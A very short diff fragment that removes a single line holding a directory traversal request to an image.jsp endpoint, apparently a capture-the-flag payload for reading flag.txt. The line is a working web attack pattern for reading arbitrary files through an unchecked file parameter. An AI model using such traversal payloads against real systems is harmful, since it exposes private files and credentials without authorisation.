@@ -1,1 +1,0 @@
-`/image.jsp?file=../../../../../../flag.txt`
